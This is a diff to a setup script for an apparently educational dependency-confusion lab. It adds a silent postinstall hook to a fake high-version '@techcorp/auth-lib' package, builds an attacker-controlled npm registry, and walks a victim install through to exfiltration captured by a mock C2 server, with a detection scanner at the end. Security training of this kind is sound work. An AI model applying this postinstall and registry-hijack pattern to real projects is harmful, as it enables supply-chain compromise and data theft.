@@ -35,13 +35,16 @@ mkdir -p detection-tools
 echo "✅ Directories created"
 echo ""
 
-# Seed malicious package metadata so flow doesn't break after copying index.js
+# Seed malicious package metadata (postinstall fires on npm install — no runtime call required)
 cat > attacker-packages/@techcorp/auth-lib/package.json << 'EOF'
 {
   "name": "@techcorp/auth-lib",
   "version": "999.999.999",
   "description": "TechCorp Authentication Library [MALICIOUS - EDUCATIONAL]",
-  "main": "index.js"
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node postinstall.js"
+  }
 }
 EOF
 
@@ -293,45 +296,45 @@ server.listen(PORT, () => {
 });
 EOF
 chmod +x infrastructure/mock-server.js
+chmod +x infrastructure/registry-server.js
 echo "✅ Mock server created"
+echo ""
+
+echo "📦 Building fake public registry (packing attacker tarball)..."
+cp templates/dependency-confusion-template.js attacker-packages/@techcorp/auth-lib/index.js
+node infrastructure/build-registry.js
 echo ""
 
 echo "================================================"
 echo "✅ Setup Complete!"
 echo "================================================"
 echo ""
-echo "🎯 Next Steps:"
+echo "🎯 Next Steps (three terminals or background two):"
 echo ""
-echo "1. Start the mock attacker server:"
-echo "   node infrastructure/mock-server.js &"
+echo "Terminal A — mock C2 server (receives exfiltrated data):"
+echo "   node infrastructure/mock-server.js"
 echo ""
-echo "2. Examine leaked data (reconnaissance):"
-echo "   cat leaked-data/package.json"
+echo "Terminal B — fake public registry (the attacker-controlled npm registry):"
+echo "   node infrastructure/registry-server.js"
 echo ""
-echo "3. Review internal packages:"
-echo "   ls -la internal-packages/@techcorp/"
+echo "Terminal C — victim (npm resolves from the attacker's registry):"
+echo "   # Examine the vulnerable .npmrc — @techcorp points to the fake registry"
+echo "   cat corporate-app/.npmrc"
 echo ""
-echo "4. Create malicious package using template:"
-echo "   cp templates/dependency-confusion-template.js attacker-packages/@techcorp/auth-lib/index.js"
+echo "   # Examine the attacker's package version (999.999.999 beats any internal version)"
+echo "   cat attacker-packages/@techcorp/auth-lib/package.json"
 echo ""
-echo "5. Confirm malicious package metadata:"
-echo "   cd attacker-packages/@techcorp/auth-lib"
-echo "   cat package.json"
-echo ""
-echo "6. Install in corporate app (link for testing):"
-echo "   cd ../../../corporate-app"
-echo "   npm install"
-echo "   # then simulate confusion by installing the attacker package:"
-echo "   npm install ../attacker-packages/@techcorp/auth-lib"
-echo ""
-echo "7. Run victim application:"
+echo "   cd corporate-app"
+echo "   rm -rf node_modules package-lock.json"
 echo "   export TESTBENCH_MODE=enabled"
+echo "   npm install   # @techcorp:registry=localhost:4874 → gets 999.999.999"
+echo "   # postinstall fires automatically; check capture:"
+echo "   curl -s http://localhost:3000/captured-data"
+echo ""
+echo "   # Run the application (still works — attack stays silent)"
 echo "   npm start"
 echo ""
-echo "8. Check for exfiltrated data:"
-echo "   curl http://localhost:3000/captured-data"
-echo ""
-echo "9. Run detection scanner:"
+echo "   # Run detection scanner:"
 echo "   node ../detection-tools/dependency-confusion-scanner.js ."
 echo ""
 echo "📖 Read full instructions: cat README.md"
